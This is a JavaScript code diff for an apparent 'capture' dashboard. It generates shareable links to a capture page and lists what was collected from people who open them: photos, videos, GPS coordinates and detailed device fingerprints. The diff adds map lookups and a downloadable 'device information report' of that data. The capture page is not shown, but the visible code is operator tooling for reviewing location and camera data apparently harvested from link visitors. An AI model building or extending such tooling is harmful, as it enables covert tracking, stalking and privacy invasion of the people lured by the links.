+        <div style="font-size:0.62rem;opacity:0.5;margin-top:6px;text-align:center;">Created: ${createdAt}</div>
+      </div>
+    `;
+  }).join("");
+}
+
+window.copyLinkById = function(linkId) {
+  const base = location.origin + location.pathname.replace(/[^/]*$/, "");
+  const url = `${base}${CAPTURE_PAGE}#v=${linkId}`;
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(url).then(() => showToast("✅ Copy!")).catch(() => fallbackCopy(url));
+  } else fallbackCopy(url);
+}
+
+window.openLinkById = function(linkId) {
+  const base = location.origin + location.pathname.replace(/[^/]*$/, "");
+  const url = `${base}${CAPTURE_PAGE}#v=${linkId}`;
+  window.open(url, "_blank");
+}
+
+window.deleteLinkById = async function(linkId) {
+  if (!confirm("Delete this link?")) return;
+  try {
+    await deleteDoc(doc(db, "links", linkId));
+    showToast("Deleted 🗑️");
+    loadMyLinks();
+  } catch (e) { showToast("Fail: " + e.message, true); }
+}
+
 function startLiveListener() {
   if (liveUnsubscribe) liveUnsubscribe();
   const q = query(collection(db, "captures"), where("ownerId", "==", currentUser.uid));
   liveUnsubscribe = onSnapshot(q, (snap) => {
     loadUserStats();
     renderMediaFromSnap(snap);
+    loadMyLinks();
   }, (err) => console.error("Live error:", err));
 }
 
@@ -576,9 +667,7 @@ window.renderMedia = async function() {
     const q = query(collection(db, "captures"), where("ownerId", "==", currentUser.uid));
     const snap = await getDocs(q);
     renderMediaFromSnap(snap);
-  } catch (e) {
-    grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;color:#ff4d4d;">Error</p>`;
-  }
+  } catch (e) { grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;color:#ff4d4d;">Error</p>`; }
 }
 
 function renderMediaFromSnap(snap) {
@@ -598,9 +687,11 @@ function renderMediaFromSnap(snap) {
     else if (i.type === "device") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(168,85,247,0.1);">📱</div>`;
     else if (i.type === "video") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(239,68,68,0.1);">🎥</div>`;
     else thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;">📎</div>`;
+
     const time = i.timestamp ? new Date(i.timestamp.seconds*1000).toLocaleString() : "";
     const loc = i.location ? `${i.location.lat?.toFixed(3)}, ${i.location.lon?.toFixed(3)}` : "";
     const web = i.website || "Modsir Tools";
+
     return `
       <div class="media-card">
         ${thumb}
@@ -608,15 +699,73 @@ function renderMediaFromSnap(snap) {
           <div class="row">🏷️ ${i.type || i.feature}</div>
           <div class="row">🌐 ${web}</div>
           ${loc ? `<div class="row">📍 ${loc}</div>` : ""}
-          ${i.device ? `<div class="row">📱 ${i.device.type || "-"}</div>` : ""}
           <div class="time">🕒 ${time}</div>
         </div>
         <div class="media-actions">
-          <button class="danger small" onclick="deleteCapture('${i.id}')">Delete</button>
+          ${i.location ? `<button class="secondary small" onclick="openMap(${i.location.lat},${i.location.lon})">🗺️</button>` : ""}
+          ${i.device ? `<button class="secondary small" onclick="downloadPDF('${i.id}')">📄</button>` : ""}
+          <button class="danger small" onclick="deleteCapture('${i.id}')">🗑️</button>
         </div>
       </div>
     `;
   }).join("");
+}
+
+window.openMap = function(lat, lon) {
+  window.open(`https://www.google.com/maps?q=${lat},${lon}`, "_blank");
+}
+
+window.downloadPDF = async function(id) {
+  try {
+    const snap = await getDoc(doc(db, "captures", id));
+    if (!snap.exists()) return;
+    const data = snap.data();
+    if (!data.device) return showToast("No device data", true);
+
+    const dev = data.device;
+    const content = `
+===========================================
+        DEVICE INFORMATION REPORT
+===========================================
+
+📱 Device Type: ${dev.type || "-"}
+🌐 Browser: ${dev.browser || "-"}
+💻 Platform: ${dev.platform || "-"}
+📺 Screen: ${dev.screen || "-"}
+🗣️ Language: ${dev.language || "-"}
+🕐 Timezone: ${dev.timezone || "-"}
+💾 Memory: ${dev.memory || "-"} GB
+⚙️ CPU Cores: ${dev.cores || "-"}
+🎮 GPU: ${dev.gpu || "-"}
+👆 Touch: ${dev.touch ? "Yes" : "No"}
+📊 Pixel Ratio: ${dev.pixelRatio || "-"}x
+🏢 Vendor: ${dev.vendor || "-"}
+🍪 Cookies: ${dev.cookies ? "Enabled" : "Disabled"}
+📶 Online: ${dev.online ? "Yes" : "No"}
+
+📡 Network:
+   Type: ${dev.network?.type || "-"}
+   Downlink: ${dev.network?.downlink || "-"} Mbps
+   RTT: ${dev.network?.rtt || "-"} ms
+
+📍 Location:
+   Lat: ${data.location?.lat || "-"}
+   Lon: ${data.location?.lon || "-"}
+   Accuracy: ${data.location?.accuracy || "-"} m
+
+🕒 Captured: ${data.timestamp?.seconds ? new Date(data.timestamp.seconds*1000).toLocaleString() : "-"}
+🌐 Website: ${data.website || "-"}
+===========================================
+    `;
+    const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `device-info-${id.slice(0,8)}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+    showToast("📄 Downloaded!");
+  } catch (e) { showToast("PDF fail", true); }
 }
 
 window.viewMedia = async function(id) {
@@ -627,7 +776,9 @@ window.viewMedia = async function(id) {
     const content = document.getElementById("modalContent");
     if (data.photo) content.innerHTML = `<img src="${data.photo}">`;
     else if (data.video) content.innerHTML = `<video src="${data.video}" controls autoplay playsinline style="max-width:100%;max-height:90vh;border-radius:16px;"></video>`;
-    else content.innerHTML = `<pre style="color:#fff;padding:20px;max-width:90vw;overflow:auto;font-size:0.8rem;">${JSON.stringify(data, null, 2)}</pre>`;
+    else {
+      content.innerHTML = `<pre style="color:#fff;padding:20px;max-width:90vw;overflow:auto;font-size:0.8rem;">${JSON.stringify(data, null, 2)}</pre>`;
+    }
     document.getElementById("modal").classList.add("active");
   } catch (e) { console.error(e); }
 }
